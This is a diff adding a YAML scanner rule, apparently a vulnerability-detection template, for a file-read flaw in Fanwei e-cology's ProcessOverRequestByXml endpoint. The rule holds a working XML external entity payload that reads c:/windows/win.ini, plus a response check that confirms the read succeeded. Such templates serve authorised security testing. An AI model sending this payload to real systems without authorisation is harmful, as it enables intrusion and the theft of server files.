@@ -1,0 +1,16 @@
+cve-id: fanwei-ecology-ProcessOverRequestByXml-readfile
+rules:
+- method: POST
+  path: /rest/ofs/ProcessOverRequestByXml
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: '*/*'
+    Connection: close
+    Content-Type: application/xml
+    Content-Length: 146
+  body: |
+    <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+  expression: 'response.body.bcontains(b"[extensions]") && response.body.bcontains(b"[fonts]") '
+severity: high
+type: readfile
